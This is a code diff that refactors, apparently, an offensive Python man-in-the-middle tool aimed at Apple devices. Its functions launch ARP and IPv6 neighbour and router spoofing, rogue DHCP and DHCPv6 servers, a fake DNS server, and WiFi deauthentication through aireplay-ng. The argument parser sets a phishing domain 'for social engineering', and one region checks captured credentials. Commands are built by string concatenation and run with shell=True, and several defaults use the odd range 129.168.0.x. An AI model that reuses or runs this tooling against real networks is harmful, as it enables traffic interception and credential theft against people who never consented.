@@ -39,13 +39,19 @@ __status__ = 'Development'
 # endregion
 
 # region Set global variables
-aireply_stop = False
+aireply_stop: bool = False
 # endregion
 
 
 # region Disconnect device
-def disconnect_device(network_interface, ip_address, mac_address, use_deauth_technique=False, deauth_interface=None,
-                      deauth_packets=5, network_channel=None, network_bssid=None):
+def disconnect_device(network_interface: str = 'eth0',
+                      ip_address: str = '129.168.0.1',
+                      mac_address: str = '12:34:56:78:90:ab',
+                      use_deauth_technique: bool = False,
+                      deauth_interface: Union[None, str] = None,
+                      deauth_packets: int = 5,
+                      network_channel: Union[None, str] = None,
+                      network_bssid: Union[None, str] = None):
 
     if not use_deauth_technique:
         # Start Network conflict creator script
@@ -61,13 +67,15 @@ def disconnect_device(network_interface, ip_address, mac_address, use_deauth_tec
 
 
 # region ARP spoofing
-def make_arp_spoof(network_interface, target_mac_address, target_ip_address, gateway_ip_address):
+def make_arp_spoof(network_interface: str = 'eth0',
+                   mac_address: str = '12:34:56:78:90:ab',
+                   ip_address: str = '129.168.0.1',
+                   gateway_ip_address: str = '129.168.0.254'):
 
     # Start ARP spoofing script
     sub.Popen(['python3 ' + project_root_path + '/Scripts/ARP/arp_spoof.py --interface ' + network_interface +
-               ' --target_ip ' + target_ip_address + ' --target_mac ' + target_mac_address +
-               ' --gateway_ip ' + gateway_ip_address + ' --quiet'],
-              shell=True)
+               ' --target_ip ' + ip_address + ' --target_mac ' + mac_address +
+               ' --gateway_ip ' + gateway_ip_address + ' --quiet'], shell=True)
 
     # Wait 3 seconds
     sleep(3)
@@ -76,20 +84,22 @@ def make_arp_spoof(network_interface, target_mac_address, target_ip_address, gat
 
 
 # region NA spoofing
-def make_na_spoof(network_interface, target_mac_address, target_ipv6_address,
-                  gateway_ipv6_address, dns_ipv6_address: Union[None, str] = None):
+def make_na_spoof(network_interface: str = 'eth0',
+                  mac_address: str = '12:34:56:78:90:ab',
+                  ipv6_address: str = 'fe80::123',
+                  gateway_ipv6_address: str = 'fe80::1',
+                  dns_ipv6_address: Union[None, str] = None):
 
     # Start Neighbor Advertise spoofing script
     if dns_ipv6_address is not None:
         sub.Popen(['python3 ' + project_root_path + '/Scripts/ICMPv6/icmpv6_spoof.py --interface ' + network_interface +
-                   ' --technique 2 --target_ip ' + target_ipv6_address + ' --target_mac ' + target_mac_address +
+                   ' --technique 2 --target_ip ' + ipv6_address + ' --target_mac ' + mac_address +
                    ' --gateway_ip ' + gateway_ipv6_address + ' --dns_ip ' + dns_ipv6_address + ' --quiet &'],
                   shell=True)
     else:
         sub.Popen(['python3 ' + project_root_path + '/Scripts/ICMPv6/icmpv6_spoof.py --interface ' + network_interface +
-                   ' --technique 2 --target_ip ' + target_ipv6_address + ' --target_mac ' + target_mac_address +
-                   ' --gateway_ip ' + gateway_ipv6_address + ' --quiet &'],
-                  shell=True)
+                   ' --technique 2 --target_ip ' + ipv6_address + ' --target_mac ' + mac_address +
+                   ' --gateway_ip ' + gateway_ipv6_address + ' --quiet &'], shell=True)
 
     # Wait 3 seconds
     sleep(3)
@@ -98,14 +108,15 @@ def make_na_spoof(network_interface, target_mac_address, target_ipv6_address,
 
 
 # region RA spoofing
-def make_ra_spoof(network_interface, target_mac_address, target_ipv6_address,
-                  gateway_ipv6_address, prefix, your_local_ipv6_address):
+def make_ra_spoof(network_interface: str = 'eth0',
+                  mac_address: str = '12:34:56:78:90:ab',
+                  ipv6_address: str = 'fe80::123',
+                  gateway_ipv6_address: str = 'fe80::1'):
 
     # Start Router Advertise spoofing script
     sub.Popen(['python3 ' + project_root_path + '/Scripts/ICMPv6/icmpv6_spoof.py --interface ' + network_interface +
-               ' --technique 1 --target_ip ' + target_ipv6_address + ' --target_mac ' + target_mac_address +
-               ' --gateway_ip ' + gateway_ipv6_address + ' --quiet &'],
-              shell=True)
+               ' --technique 1 --target_ip ' + ipv6_address + ' --target_mac ' + mac_address +
+               ' --gateway_ip ' + gateway_ipv6_address + ' --quiet &'], shell=True)
 
     # Wait 3 seconds
     sleep(3)
@@ -114,11 +125,13 @@ def make_ra_spoof(network_interface, target_mac_address, target_ipv6_address,
 
 
 # region Rogue DHCP server
-def rogue_dhcp_server(network_interface, target_mac_address, target_ip_address):
+def rogue_dhcp_server(network_interface: str = 'eth0',
+                      mac_address: str = '12:34:56:78:90:ab',
+                      ip_address: str = '129.168.0.1'):
 
     # Start DHCP rogue server
     sub.Popen(['python3 ' + project_root_path + '/Scripts/DHCP/dhcp_rogue_server.py --interface ' + network_interface +
-               ' --target_ip ' + target_ip_address + ' --target_mac ' + target_mac_address + ' --apple --quiet &'],
+               ' --target_ip ' + ip_address + ' --target_mac ' + mac_address + ' --apple --quiet &'],
               shell=True)
 
     # Wait 3 seconds
@@ -128,12 +141,13 @@ def rogue_dhcp_server(network_interface, target_mac_address, target_ip_address):
 
 
 # region Rogue DHCP server with predict next transaction ID
-def rogue_dhcp_server_predict_trid(network_interface, target_mac_address, new_target_ip_address):
+def rogue_dhcp_server_predict_trid(network_interface: str = 'eth0',
+                                   mac_address: str = '12:34:56:78:90:ab',
+                                   new_ip_address: str = '129.168.0.111'):
 
     # Start DHCP rogue server with predict next transaction ID
     sub.Popen(['python3 ' + project_root_path + '/Scripts/Apple/apple_rogue_dhcp.py --interface ' + network_interface +
-               ' --target_new_ip ' + new_target_ip_address + ' --target_mac ' + target_mac_address + ' --quiet'],
-              shell=True)
+               ' --target_new_ip ' + new_ip_address + ' --target_mac ' + mac_address + ' --quiet'], shell=True)
 
     # Wait 3 seconds
     sleep(3)
@@ -142,12 +156,15 @@ def rogue_dhcp_server_predict_trid(network_interface, target_mac_address, new_ta
 
 
 # region Rogue DHCPv6 server
-def rogue_dhcpv6_server(network_interface, prefix, target_mac_address, target_global_ipv6_address):
+def rogue_dhcpv6_server(network_interface: str = 'eth0',
+                        prefix: str = 'fd00::/64',
+                        mac_address: str = '12:34:56:78:90:ab',
+                        global_ipv6_address: str = 'fe80::123'):
 
     # Start DHCPv6 rogue server
     sub.Popen(['python3 ' + project_root_path + '/Scripts/DHCP/dhcpv6_rogue_server.py --interface ' +
-               network_interface + ' --prefix ' + prefix + ' --target_ip ' + target_global_ipv6_address +
-               ' --target_mac ' + target_mac_address + ' --quiet &'], shell=True)
+               network_interface + ' --prefix ' + prefix + ' --target_ip ' + global_ipv6_address +
+               ' --target_mac ' + mac_address + ' --quiet &'], shell=True)
 
     # Wait 3 seconds
     sleep(3)
@@ -156,30 +173,31 @@ def rogue_dhcpv6_server(network_interface, prefix, target_mac_address, target_gl
 
 
 # region Start DNS server
-def start_dns_server(network_interface, target_mac_address, technique_index,
-                     fake_ip_address, mitm_success_domain):
+def start_dns_server(network_interface: str = 'eth0',
+                     mac_address: str = '12:34:56:78:90:ab',
+                     technique_index: int = 1,
+                     fake_ip_address: str = '129.168.0.2',
+                     mitm_success_domain: str = 'test.com'):
 
     if technique_index in [1, 2, 3]:
         dns_server.listen(listen_network_interface=network_interface,
-                          target_mac_address=target_mac_address,
+                          target_mac_address=mac_address,
                           fake_answers=True,
                           fake_ipv4_addresses=[fake_ip_address],
                           success_domains=['captive.apple.com', mitm_success_domain])
 
     if technique_index in [4, 5, 6]:
         dns_server.listen(listen_network_interface=network_interface,
-                          target_mac_address=target_mac_address,
+                          target_mac_address=mac_address,
                           fake_answers=True,
                           fake_ipv4_addresses=[fake_ip_address],
                           listen_ipv6=True,
                           success_domains=['captive.apple.com', mitm_success_domain])
-
-
 # endregion
 
 
 # region Requests sniffer PRN function
-def requests_sniffer_prn(request):
+def requests_sniffer_prn(request: Dict):
     global aireply_stop
 
     # region Stop aireplay-ng
@@ -192,7 +210,7 @@ def requests_sniffer_prn(request):
 
 
 # region Requests sniffer function
-def requests_sniffer(source_mac_address):
+def requests_sniffer(source_mac_address: str = '12:34:56:78:90:ab'):
 
     # region Set network filter
     network_filters = {'Ethernet': {'source': source_mac_address}}
@@ -225,7 +243,11 @@ def requests_sniffer(source_mac_address):
 
 
 # region WiFi deauth packets sender
-def deauth_packets_send(network_interface, network_channel, network_bssid, mac_address, number_of_deauth):
+def deauth_packets_send(network_interface: str = 'eth0',
+                        network_channel: str = '1',
+                        network_bssid: str = '12:34:56:78:90:ab',
+                        mac_address: str = '12:34:56:78:90:ac',
+                        number_of_deauth: int = 5):
     global aireply_stop
 
     # Start target requests sniffer function
@@ -250,7 +272,8 @@ def deauth_packets_send(network_interface, network_channel, network_bssid, mac_a
         try:
             base.print_info('Send WiFi deauth packets in aireplay-ng ...')
             aireplay_process = sub.Popen(['aireplay-ng ' + network_interface +
-                                          ' -0 ' + str(deauth_packets_number) + ' -a ' + network_bssid +
+                                          ' -0 ' + str(deauth_packets_number) +
+                                          ' -a ' + network_bssid +
                                           ' -c ' + mac_address], shell=True, stdout=sub.PIPE)
             while True:
                 output = aireplay_process.stdout.readline().decode()
@@ -357,7 +380,8 @@ if __name__ == '__main__':
                                  '2. Send WiFi deauthentication packets\n3. Do not disconnect device after MiTM')
         parser.add_argument('-l', '--listen_iface', type=str, help='Set interface name for send DHCPACK packets')
         parser.add_argument('-d', '--deauth_iface', type=str, help='Set interface name for send wifi deauth packets')
-        parser.add_argument('-0', '--deauth_packets', type=int, help='Set number of deauth packets (default: 5)', default=5)
+        parser.add_argument('-0', '--deauth_packets', type=int, help='Set number of deauth packets (default: 5)',
+                            default=5)
         parser.add_argument('-f', '--phishing_domain', type=str, default='auth.apple.wi-fi.com',
                             help='Set domain name for social engineering (default="auth.apple.wi-fi.com")')
         parser.add_argument('-p', '--phishing_domain_path', type=str, default='apple',
@@ -900,8 +924,8 @@ if __name__ == '__main__':
         if technique_index == 5:
 
             # region Start Neighbor Advertise spoof
-            make_na_spoof(listen_network_interface, target_mac_address, target_ip_address,
-                          gateway_ipv6_address, dns_ipv6_address)
+            make_na_spoof(listen_network_interface, target_mac_address, target_ip_address, gateway_ipv6_address,
+                          dns_ipv6_address)
             # endregion
 
         # endregion
@@ -910,16 +934,15 @@ if __name__ == '__main__':
         if technique_index == 6:
 
             # region Start Neighbor Advertise spoof
-            make_ra_spoof(listen_network_interface, target_mac_address, target_ip_address,
-                          gateway_ipv6_address, real_prefix, your_local_ipv6_address)
+            make_ra_spoof(listen_network_interface, target_mac_address, target_ip_address, gateway_ipv6_address)
             # endregion
 
         # endregion
 
         # region Disconnect device
         if disconnect:
-            disconnect_device(listen_network_interface, target_ip_address, target_mac_address,
-                              deauth, deauth_network_interface, args.deauth_packets, channel, bssid)
+            disconnect_device(listen_network_interface, target_ip_address, target_mac_address, deauth,
+                              deauth_network_interface, args.deauth_packets, channel, bssid)
         # endregion
 
         # region Check credentials
